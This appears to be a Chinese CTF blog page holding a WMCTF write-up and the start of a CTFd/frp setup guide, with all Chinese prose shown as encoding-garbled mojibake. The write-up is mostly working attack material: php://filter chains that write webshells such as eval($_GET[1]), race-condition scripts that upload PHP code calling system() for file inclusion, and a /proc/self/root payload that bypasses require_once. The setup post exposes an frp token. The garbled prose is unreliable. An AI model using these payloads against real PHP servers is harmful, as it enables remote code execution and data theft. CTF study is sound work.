<p>å¦‚æœæˆ‘ä»¬ä¸Šä¼ <code>&lt;?cuc cucvasb();?&gt;</code>ï¼Œç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?php phpinfo();?&gt;</code>ã€‚</p>
<p>è¿™å°±æ˜¯Pç¥çš„ä¸‰ç§ç»•è¿‡exitçš„æ–¹æ³•ï¼Œä½†æ˜¯é¢˜ç›®è¿‡æ»¤äº†<code>rot</code>ï¼Œ<code>base64</code>ï¼Œä»¥åŠ<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>ï¼Œå‰åä¸¤ä¸ªåœ°æ–¹éƒ½æ˜¯contentï¼Œæ‰€ä»¥è¿™é¢˜çš„è§£æ³•è¦æ”¹ä¸€ä¸‹ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´å¾€æ–‡ä»¶é‡Œé¢å†™ä¸œè¥¿å¹¶ç»•è¿‡exitæ˜¯è¿™æ ·çš„</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/some_thing/resource=1.php</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚è¯´å†™ä¸€ä¸ª<code>.htaccess</code>(è¿™é‡Œå‚è€ƒhhhmå¸ˆå‚…åšå®¢)</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/?&gt;AddType application/x-httpd-php .jpg%0aphp_value auto_append_file &#x27;php://filter/convert.ba\%0Ase64-decode/reso\%0Aurce=a.jpg&#x27;%0A%23/resource=.htaccess</span><br></pre></td></tr></table></figure>

<p>ä¼šå¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">&#x27;php://filter/convert.ba\</span></span><br><span class="line"><span class="string">se64-decode/reso\</span></span><br><span class="line"><span class="string">urce=a.jpg&#x27;</span></span><br><span class="line"><span class="comment">#/resource=.htaccess</span></span><br></pre></td></tr></table></figure>

<p>å‰ç½®çŸ¥è¯†çœ‹å¥½åï¼Œä¸‹é¢æ˜¯å®˜æ–¹çš„è§£æ³•äº†ã€‚</p>
<h3 id="äºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#äºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="äºŒæ¬¡ç¼–ç ç»•è¿‡"></a><strong>äºŒæ¬¡ç¼–ç ç»•è¿‡</strong></h3><p><code>file_put_contents</code>ä¸­å¯ä»¥è°ƒç”¨ä¼ªåè®®ï¼Œè€Œä¼ªåè®®å¤„ç†æ—¶ä¼šå¯¹è¿‡æ»¤å™¨urldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åˆ©ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡çš„ï¼Œä¸è¿‡%25è¢«banäº†ï¼Œæµ‹è¯•%25è¢«banåå°±å¯ä»¥å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å­—ç¬¦ï¼Œæ„é€ ä¸€äº›è¿‡æ»¤çš„å­—ç¬¦å°±å¯ä»¥åˆ©ç”¨æ­£å¸¸çš„å§¿åŠ¿ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#æ„é€ rçš„äºŒæ¬¡ç¼–ç  </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">&#x27;%&#x27;</span>.$ascii1.<span class="string">&#x27;%&#x27;</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">&#x27;: &#x27;</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php </span><br><span class="line"><span class="comment">#Cyc1e.php </span></span><br><span class="line">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.%72bg13|&lt;?php phpinfo();?&gt;|/erfbhepr=Plp1r.cuc </span><br></pre></td></tr></table></figure>

<h3 id="è¿‡æ»¤å™¨ç»•è¿‡"><a href="#è¿‡æ»¤å™¨ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å™¨ç»•è¿‡"></a><strong>è¿‡æ»¤å™¨ç»•è¿‡</strong></h3><p>é¢˜ç›®ä¸­è¿‡æ»¤çš„è¿‡æ»¤å™¨æœ‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/iconv|UCS|UTF|rot|quoted|base64/ </span><br></pre></td></tr></table></figure>

<p>é¢„ç•™äº†zlibã€bzip2ã€stringç­‰è¿‡æ»¤å™¨ï¼Œ <code>php:filter</code> æ”¯æŒä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ <code>zlib</code> çš„ <code>zlib.deflate</code> å’Œ <code>zlib.inflate</code> æ¥åšï¼Œå‹ç¼©åå†è§£å‹åå†…å®¹è‚¯å®šä¸å˜ï¼Œå¯ä»¥åœ¨ä¸­é—´éå†ä¸€ä¸‹å‰©ä¸‹çš„å‡ ä¸ªè¿‡æ»¤å™¨ï¼Œçœ‹çœ‹ä¸­é—´æ“ä½œæ—¶å€™æ˜¯å¦ä¼šå½±å“åç»­inflateçš„å†…å®¹ï¼Œç®€å•éå†ä¸€ä¸‹å¯ä»¥å‘ç°ä¸­é—´æ’å…¥string.tolowerè½¬åä¼šæŠŠç©ºæ ¼å’Œexitå¤„ç†äº†å°±å¯ä»¥ç»•è¿‡exit</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e.php </span><br></pre></td></tr></table></figure>

<p>ä¼šç”Ÿæˆè¿™ä¸ª</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php@â€¦xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m|?&gt;&lt;?php</span><br><span class="line">eval($_GET[1]);?&gt;/vesouvce=Cyc1e.&lt;?p</span><br></pre></td></tr></table></figure>

<h3 id="çˆ†ç ´ä¸´æ—¶æ–‡ä»¶"><a href="#çˆ†ç ´ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="çˆ†ç ´ä¸´æ—¶æ–‡ä»¶"></a><strong>çˆ†ç ´ä¸´æ—¶æ–‡ä»¶</strong></h3><p>ç¯å¢ƒç‰¹åœ°è®¾ç½®äº†php 7.0.33ç‰ˆæœ¬ï¼Œç”±äºfile_put_contentsä¹Ÿå¯ä»¥åˆ©ç”¨ä¼ªåè®®ï¼Œæ‰€ä»¥è€é—®é¢˜ï¼Œåˆ©ç”¨string.strip_tagsä¼šå‘ç”Ÿæ®µé”™è¯¯ï¼Œè¿™æ—¶å€™ä¸Šä¼ ä¸€ä¸ªshellä¼šä»¥ä¸´æ—¶æ–‡ä»¶çš„å½¢å¼ä¿å­˜åœ¨/tmpä¸­ï¼Œåˆ©ç”¨require_onceåŒ…å«getshellå³å¯ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">â€‹</span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">â€‹</span><br><span class="line">host = <span class="string">&quot;web_checkin2.wmctf.wetolink.com&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line">â€‹</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line"> Â   files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line"> Â   <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â   response = requests.post(url, files=files)</span><br><span class="line"> Â   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â   <span class="keyword">print</span> e</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line"> Â   file_content = <span class="string">&#x27;&lt;?php system(&quot;xxxxxxxx&quot;);?&gt;&#x27;</span></span><br><span class="line"> Â   phpinfo_url = <span class="string">&quot;%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php&quot;</span> % (</span><br><span class="line"> Â  Â  Â   base_url)</span><br><span class="line"> Â   <span class="keyword">print</span> phpinfo_url</span><br><span class="line"> Â   length = <span class="number">6</span></span><br><span class="line"> Â   times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"> Â   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line"> Â  Â  Â   <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line"> Â  Â  Â   upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line">â€‹</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> Â   generate_tmp_files()</span><br></pre></td></tr></table></figure>

<h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a><strong>Make PHP Great Again</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå› ä¸º<code>flag.php</code>è¢«<code>require_once</code>åŒ…å«è¿‡ä¸€æ¬¡äº†ï¼Œæ‰€ä»¥ä¸‹é¢å¦‚æœç”¨ä¼ªåè®®å»è¯»çš„è¯ï¼Œæ˜¯è¯»å–ä¸åˆ°flag.phpçš„å†…å®¹çš„ã€‚ç¬¬ä¸€ä¸ªç‰ˆæœ¬å­˜åœ¨éé¢„æœŸï¼šsession.upload_progress</p>
<p>å…·ä½“å¯ä»¥å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>åŸç†å°±æ˜¯åˆ©ç”¨çš„æ˜¯æ¡ä»¶ç«äº‰ï¼Œä¸Šä¼ ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ–‡ä»¶å¢åŠ sessionæ–‡ä»¶çš„å­˜åœ¨æ—¶é—´ä½¿å¾—åŒ…å«æˆåŠŸã€‚</p>
<h2 id="Make-PHP-Great-Again2"><a href="#Make-PHP-Great-Again2" class="headerlink" title="Make PHP Great Again2"></a><strong>Make PHP Great Again2</strong></h2><p>PHPæœ€æ–°ç‰ˆ çš„å° Trickï¼Œ require_once åŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šäº‹ once çš„ hash åŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ã€‚</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h2 id="Happy-birthday"><a href="#Happy-birthday" class="headerlink" title="Happy_birthday!"></a><strong>Happy_birthday!</strong></h2><p>æ‰“å¼€é¢˜ç›®çœ‹åˆ°æ–‡ä»¶åâ€daolnwod.zipâ€ï¼Œçœ‹åˆ°æ–‡ä»¶ç»“å°¾çš„4B 50ä¸éš¾æƒ³åˆ°å°†æ–‡ä»¶reverseåå°±èƒ½å¾—åˆ°å‹ç¼©åŒ…å’Œflag </p>
<p>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;daolnwod.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = f[::<span class="number">-1</span>]</span><br><span class="line">f2 = open(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(f)</span><br></pre></td></tr></table></figure>

<p>è§£å‹å³å¯å¾—åˆ°flagã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/07/27/%E6%90%AD%E5%BB%BA%E5%8A%A8%E6%80%81CTFd/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
      <meta itemprop="name" content="kawhi">
      <meta itemprop="description" content="æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kawhi">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/27/%E6%90%AD%E5%BB%BA%E5%8A%A8%E6%80%81CTFd/" class="post-title-link" itemprop="url">æ­å»ºåŠ¨æ€CTFd</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-07-27 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-27T00:00:00+08:00">2020-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-16 11:53:08" itemprop="dateModified" datetime="2020-10-16T11:53:08+08:00">2020-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">ç¯å¢ƒæ­å»º</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h3><p>ç½‘ä¸Šçš„æ­å»ºæ•™ç¨‹æœ‰å¾ˆå¤šäº†ï¼Œä½†æ˜¯æœ‰å‡ ä¸ªæ¯”è¾ƒå‘çš„åœ°æ–¹çš„èµ„æ–™æ¯”è¾ƒé›¶æ•£ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ä»é›¶å¼€å§‹æ­å»ºçš„è¿‡ç¨‹ï¼Œè™½ç„¶å› ä¸ºå„ç§åŸå› æœ€åè¿˜æ˜¯å­¦è´¤å¤§ä½¬å¸®æˆ‘æ­å¥½äº†ğŸ™ƒï¼Œè¿™ä¸ªåŠ¨æ€é¶æœºæ˜¯çœŸçš„æ–¹ä¾¿ã€‚</p>
<h3 id="å‰ç½®å·¥ä½œ"><a href="#å‰ç½®å·¥ä½œ" class="headerlink" title="å‰ç½®å·¥ä½œ"></a><strong>å‰ç½®å·¥ä½œ</strong></h3><p>æœ¬ç¯‡æ­å»ºç¯å¢ƒä¸ºcentos7.6</p>
<p>å­¦è´¤å¤§ä½¬ç”¨çš„æ˜¯ubuntu18ä¹Ÿæ­æˆåŠŸäº†ï¼Œä½†æ˜¯ç›¸å¯¹æ¥è¯´è¿˜æ˜¯centosæ¯”è¾ƒæ–¹ä¾¿ã€‚</p>
<h4 id="æ›´æ–°yumæº"><a href="#æ›´æ–°yumæº" class="headerlink" title="æ›´æ–°yumæº"></a><strong>æ›´æ–°yumæº</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y git nginx mariadb mariadb-server Mysql-python python-pip gcc  python-devel yum-utils device-mapper-persistent-data lvm2 epel-release</span><br></pre></td></tr></table></figure>

<h4 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a><strong>å®‰è£…docker</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ¢æº</span></span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment">#æŸ¥çœ‹å¹¶é€‰æ‹©åˆé€‚çš„dockerç‰ˆæœ¬</span></span><br><span class="line">yum list docker-ce --showduplicates | sort -r</span><br><span class="line"><span class="comment">#å®‰è£…docker</span></span><br><span class="line">yum -y install docker-ce</span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">docker --version</span><br><span class="line"><span class="comment">#å¯åŠ¨docker</span></span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<h4 id="å®‰è£…docker-compose"><a href="#å®‰è£…docker-compose" class="headerlink" title="å®‰è£…docker-compose"></a><strong>å®‰è£…docker-compose</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install python3-pip</span><br><span class="line">pip3 install docker-compose</span><br><span class="line"><span class="comment">#æ›´æ”¹äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒé™</span></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment">#æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<h4 id="dockeré•œåƒåŠ é€Ÿ"><a href="#dockeré•œåƒåŠ é€Ÿ" class="headerlink" title="dockeré•œåƒåŠ é€Ÿ"></a><strong>dockeré•œåƒåŠ é€Ÿ</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://e5ee9xyr.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…frp"><a href="#å®‰è£…frp" class="headerlink" title="å®‰è£…frp"></a><strong>å®‰è£…frp</strong></h3><h4 id="ä¸‹è½½frp"><a href="#ä¸‹è½½frp" class="headerlink" title="ä¸‹è½½frp"></a><strong>ä¸‹è½½frp</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line">wget https://github.com/fatedier/frp/releases/download/v0<span class="number">.29</span><span class="number">.0</span>/frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64.tar.gz</span><br><span class="line">cd frp_0<span class="number">.29</span><span class="number">.0</span>_linux_amd64</span><br><span class="line">cp systemd/* /etc/systemd/system/</span><br><span class="line">mkdir /etc/frp</span><br><span class="line">cp frpc.ini  frps.ini /etc/frp/</span><br><span class="line">cp frpc  frps /usr/bin/</span><br><span class="line">chmod a+x /usr/bin/frpc /usr/bin/frps</span><br><span class="line">systemctl enable frps</span><br></pre></td></tr></table></figure>

<p>FRPçš„æ–‡ä»¶wgetå¤ªæ…¢çš„è¯ï¼Œå¯ä»¥ä¸‹è½½åå†ç›´æ¥æ‹–åˆ°rootçš„ç›®å½•ä¸‹ã€‚</p>
<h4 id="ä¿®æ”¹frps-ini"><a href="#ä¿®æ”¹frps-ini" class="headerlink" title="ä¿®æ”¹frps.ini"></a><strong>ä¿®æ”¹<code>frps.ini</code></strong></h4><p>ä¿®æ”¹<code>frps.ini</code>å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/frp/frps.ini</span><br></pre></td></tr></table></figure>

<p><code>frps.ini</code>çš„å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">7897</span></span><br><span class="line">bind_addr = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">token = jplXcUyxdqn0y2RIzaLTDoaXET5Gbo78</span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨frpsç³»ç»ŸæœåŠ¡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start frps</span><br></pre></td></tr></table></figure>

<h4 id="ä¿®æ”¹frpc-ini"><a href="#ä¿®æ”¹frpc-ini" class="headerlink" title="ä¿®æ”¹frpc.ini"></a><strong>ä¿®æ”¹<code>frpc.ini</code></strong></h4><p>ä¿®æ”¹<code>frpc.ini</code>é…ç½®æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/frp/frpc.ini</span><br></pre></td></tr></table></figure>

